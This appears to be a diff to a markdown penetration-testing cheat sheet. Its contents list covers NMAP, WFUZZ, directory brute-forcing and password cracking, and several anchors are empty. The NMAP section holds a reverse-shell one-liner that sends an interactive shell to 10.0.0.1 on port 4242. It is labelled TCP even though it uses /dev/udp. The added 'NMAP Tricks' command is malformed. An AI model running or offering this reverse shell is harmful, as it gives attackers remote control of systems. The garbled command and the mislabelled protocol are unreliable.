@@ -2,6 +2,9 @@
 
 ## Summary
 * [NMAP](#NMAP)
+   * [](#)
+   * [](#)
+   * [](#)
 * [WFUZZ](#WFUZZ)
 * [Directory](#Directory)
    * [DB](#DIRB)
@@ -9,14 +12,17 @@
 * [Credentials](#)
    * [John-the-Ripper](#)
    * [hashcat](#)
-* [](#)
+   * [](#)
 * [](#)
 * [](#)
 * [](#)
  
 
 ### NMAP
-
+#### NMAP Tricks
+```
+/usr/share/nmap/scripts | grep smb
+```
 ```
 TCP:
 sh -i >& /dev/udp/10.0.0.1/4242 0>&1
